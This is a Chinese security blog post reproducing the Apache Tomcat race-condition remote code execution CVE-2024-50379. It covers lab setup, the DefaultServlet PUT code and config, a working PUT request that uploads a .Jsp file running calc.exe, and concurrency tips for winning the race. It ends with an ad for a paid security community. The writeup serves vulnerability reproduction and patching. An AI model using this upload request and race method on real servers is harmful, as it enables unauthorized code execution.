#  Apache Tomcat 最新RCE 稳定复现+分析 保姆级！附复现视频+POC   
原创 Ting丶  Ting的安全笔记   2024-12-19 07:32  
  
**#首先感谢Btwlon、阿呆攻防公众号主两位师傅的耐心答复！**  
  
#WingBy小密圈知识星球简介在文末。  
# 前言  
  
最近爆出 Apache Tomcat条件竞争导致的RCE，影响范围当然是巨大的，公司也及时收到了相关情报，于是老大让我复现，以更好的帮助公司进行修复漏洞。  
  
复现难度其实并不大，但是成功率很低，我在复现过程中也尝试了很多tomcat、java版本，操作一样但结果不同，相信很多师傅也在复现，希望能够成功，所以我对“成功率”进行了一点点研究，希望能够提高师傅们复现成功的概率。  
# 环境搭建  
  
经过多次的尝试，建议大家使用java8不要用太高的java版本 否则难以复现成功（  
关注后台回复20241219可以获取跟我一样的漏洞复现环境和POC）这里使用的环境如下：  
  
jre1.8.0_202  
  
apache-tomcat-9.0.63  
  
**windows虚拟机**  
  
配置环境变量  
  
这里一定要配置JAVA_HOME否则会报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKwbtOHmiaPDKJ7eBqlib8K3T4kV4ngB3bmjyImXcm9uCywW6JPFb1YkIg/640?wx_fmt=png&from=appmsg "")  
  
需要将这个版本的java的环境变量置顶，防止其他版本的干扰，大家应该都明白  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKMyVgDPvbllNOWSM4ia5DPhiaZAol9Ij2Xicp8gjtKZ3H750QwFgZAjsYA/640?wx_fmt=png&from=appmsg "")  
  
配置CATALINA_BASE  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKuuOPfDXmcKibH8WEk2ye3oIPJZ4s9ktfhCveHZlDLofXtOdnnTtaiaicg/640?wx_fmt=png&from=appmsg "")  
  
这下环境变量就已经配置齐了 这个时候就已经可以正常启动tomcat了 运行这个批处理文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKelM6Oj4hHRhfQQWbdJniblaALicEXo45Eypfd2InVicUC74oQ0zSQ2wQQ/640?wx_fmt=png&from=appmsg "")  
  
启动成功（乱码无所谓的 web.xml改一下GBK即可）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKicdSomeAYTRQbjgGgDtgDwFtnhgT8ZPDAsRrlaCT2vmnVSdanf1dyxA/640?wx_fmt=png&from=appmsg "")  
# 漏洞分析  
  
影响版本  
  
11.0.0-M1 <= Apache Tomcat < 11.0.2  
  
10.1.0-M1 <= Apache Tomcat < 10.1.34  
  
9.0.0.M1 <= Apache Tomcat < 9.0.98  
  
漏洞原理  
  
首先来看看著名的**CVE-2017-12615**  
，我们查看tomocat的配置 (conf/web.xml)  
```
    <!-- The mapping for the default servlet -->
    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

    <!-- The mappings for the JSP servlet -->
    <servlet-mapping>
        <servlet-name>jsp</servlet-name>
        <url-pattern>*.jsp</url-pattern>
        <url-pattern>*.jspx</url-pattern>
    </servlet-mapping>
```  
  
当请求的后缀为jsp或jspx的时候交由JSP servlet进行处理请求，此外交给default servlet进行处理请求。而我们查看**CVE-2017-12615**  
的payload可知，它对文件后缀采取了一些绕过，例如PUT一个1.jsp/、1.jsp空格、1.jsp%00从而绕过JSP servlet的限制，让default servlet来处理请求。当default servlet处理PUT请求时如下图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKwnGLXeYKnvjH4phc0icFTDuWTXcibbnK1vGA9kWTXywAZo4tdk0bThGg/640?wx_fmt=png&from=appmsg "")  
```
    @Override
    protected void doPut(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {

        if (readOnly) {
            sendNotAllowed(req, resp);
            return;
        }

        String path = getRelativePath(req);

        WebResource resource = resources.getResource(path);

        Range range = parseContentRange(req, resp);

        if (range == null) {
            // Processing error. parseContentRange() set the error code
            return;
        }

        InputStream resourceInputStream = null;

        try {
            // Append data specified in ranges to existing content for this
            // resource - create a temp. file on the local filesystem to
            // perform this operation
            // Assume just one range is specified for now
            if (range == IGNORE) {
                resourceInputStream = req.getInputStream();
            } else {
                File contentFile = executePartialPut(req, range, path);
                resourceInputStream = new FileInputStream(contentFile);
            }

            if (resources.write(path, resourceInputStream, true)) {
                if (resource.exists()) {
                    resp.setStatus(HttpServletResponse.SC_NO_CONTENT);
                } else {
                    resp.setStatus(HttpServletResponse.SC_CREATED);
                }
            } else {
                resp.sendError(HttpServletResponse.SC_CONFLICT);
            }
        } finally {
            if (resourceInputStream != null) {
                try {
                    resourceInputStream.close();
                } catch (IOException ioe) {
                    // Ignore
                }
            }
        }
    }
```  
  
会去检查配置文件中的readonly的值是否为false，如果是true的话就直接return也就是不允许put请求，所以我们需要在配置文件中进行如下设置 (conf/web.cml) 注意是default servlet，因为上面讲了我们最终处理put请求是default servlet  
```
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>

        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
        <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
```  
  
最终就可以进行put上传shell了，这个就是**CVE-2017-12615**  
。  
  
那么再看看最近很火的CVE-2024-50379。原理是条件竞争，通过并发put文件上传非标准后缀的“jsp”，并不断发起get请求一个标准后最的“jsp”文件，最终由于服务器的大小写不敏感，导致请求成功造成RCE。  
  
看看pyload是put一个xxx.Jsp（也可以PUT html........），为什么长这样呢？阅读了上文，固然就明白了。 当然是要绕过jsp servlet的后缀匹配规则了然后让default servlet去处理请求。  
  
现在我们尝试PUT一下 数据包如下  
```
PUT /test.Jsp HTTP/1.1
Host: 192.168.19.135:8080

<% Runtime.getRuntime().exec("calc.exe");%>

```  
  
返回状态码是201代表上传成功 可以去webapps/ROOT目录看到  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQK89RiaA9fY9HLurD87GsbEIXQcC4WkwCKf0yngibtI3UW6EaFadaDVBKQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKz2ibHWunVTY5UribYnDyP1ktV93Lnib19NL92hAcLXbqHmXUMBN2dRNuQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKtFyj704mAepiaXNlXaIUMa6WFXCAdCXXkJicFA3iaMf37z0Nk8g4u6icfQ/640?wx_fmt=png&from=appmsg "")  
  
再次重放请求的时候就是204的状态码了  说明文件已经存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKER5ibk1nbXGDBbuUaETqEMHIoUyAAHa89kxjK1wvnk99YX27NkBlwuw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKUectRxqu30IF4ibx2PMPO1ZjwTBOr4JRHt0qyATtcib9Iu1wLMV64mjA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKGqLjjVbQ0JVDX97lOqUpib2wKFaHahKwIVwUzPfiaiboJUFHuNY5kb08w/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现  
  
接下来开始复现该漏洞 我用的是window虚拟机 而不是真机，因为我电脑内存太大，可能效果不会很明显，毕竟要用到条件竞争，所以如果想成功率高一点建议用虚拟机，把内核、内存大小设置小一点。  
  
yakit-发送到webFuzzer 发三个  get的并发线程建议大于前面两个  
  
第一个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKpicHcFBvsibGIedZjUyX5CQhict0lu7KLTd5LS9UvHJ1Oqic9kt8YP8Mfw/640?wx_fmt=png&from=appmsg "")  
  
第二个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKiadeWJfeiayaoicaxGOo3ibFgCKpTx78I8O1dA47gcRuw1qWGUQeBwPDyQ/640?wx_fmt=png&from=appmsg "")  
  
第三个   
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKnFDVibmE0Qib20qnyAWGv0qIPoLvyIMr2p69CsBibRk7z6pzVFxnWOIUw/640?wx_fmt=png&from=appmsg "")  
  
开弹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQK2moaTEXOKtSBp53YicdhFJ8xxbZS21cSjVyKs3A5y0bkXQglicicfHCtw/640?wx_fmt=png&from=appmsg "")  
  
在我虚拟机卡的时候往往容易成功 有时候直接用yakit就能成功，有时候不行，所以我同时用yakit和脚步一起打   
  
关注后台回复20241219可以获取跟我一模一样的漏洞复现环境和POC  
  
本地复现视频如下  
  
  
我们的星球涵盖了红蓝攻防、企业/公益SRC、各类证书挖掘包括但不限于EDU、CNVD等、Java/PHP0Day代码审计、免杀对抗、云安全攻防、CTF、安全开发、逆向等等各个方向，还有很多高质量的文章，以及秘密工具。别的星球有的我们未必没有。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKxtq6Qm4fic7oCOiaVuZcaH3KHoMB99mrlicgEVyaWO0vk6Q8LmFibvYicuw/640?wx_fmt=png&from=appmsg "")  
  
星球  
内部工具之一再次更新   
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vcj9ATiamooqKvV1HuIHibMQKSbO1N4ricN93tP0qGeBw5qiay5wZOloJNvmiacqRjiaNicfaewDfgP49ibibg/640?wx_fmt=png&from=appmsg "")  
  
  
